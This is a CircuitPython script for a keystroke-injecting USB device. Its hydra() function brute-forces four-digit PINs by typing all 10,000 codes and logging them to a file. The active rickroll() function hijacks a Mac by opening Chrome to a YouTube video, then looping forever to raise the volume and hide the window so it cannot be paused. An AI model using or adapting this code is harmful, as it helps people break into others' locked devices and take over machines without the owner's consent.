# base python libraries
import os
import time
# base hid
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
# single keycodes
from adafruit_hid.keycode import Keycode
# voloume buttons etc
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.consumer_control_code import ConsumerControlCode

# keyboard setup
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
misc = ConsumerControl(usb_hid.devices)

def hydra():
    pin = 0
    tickK = -1
    interval0 = 10000
    interval1 = 100
    interval2 = 10

    # clear pin file
    with open("pin.txt", "w", encoding="utf-8") as file:
        file.write("")

    while pin < 10000:
        # type this pin
        # print(f"{pin:04d}")
        layout.write(f"{pin:04d}")

        # then write the pin to a file
        with open("pin.txt", "a", encoding="utf-8") as file:
            file.write(f"{pin:04d}\n")

        time.sleep(0.01)
        pin += 1
        tickK += 1

        if tickK == interval0: # set interval2 for 100s and so on when cracking
            tickK = 0
            time.sleep(5)
            continue

def rickroll():
    # WORKS BEST ON MAC
    # allow and pass keyboard assistant
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    keyboard.send(Keycode.ESCAPE)
    time.sleep(0.1)

    # open chrome
    keyboard.send(Keycode.GUI, Keycode.SPACEBAR)
    time.sleep(0.1)
    layout.write("chrome")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)

    # open tab and open video
    keyboard.send(Keycode.GUI, Keycode.T)
    layout.write("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n")
    # wait 3 seconds to play
    time.sleep(3)
    keyboard.send(Keycode.SPACEBAR)
    # hide window so you cant pause it
    # lock voloume all the way up
    while True:
        misc.send(ConsumerControlCode.VOLUME_INCREMENT)
        keyboard.send(Keycode.GUI, Keycode.H)


# FUNCTION CALLS
#hydra()
rickroll()
 
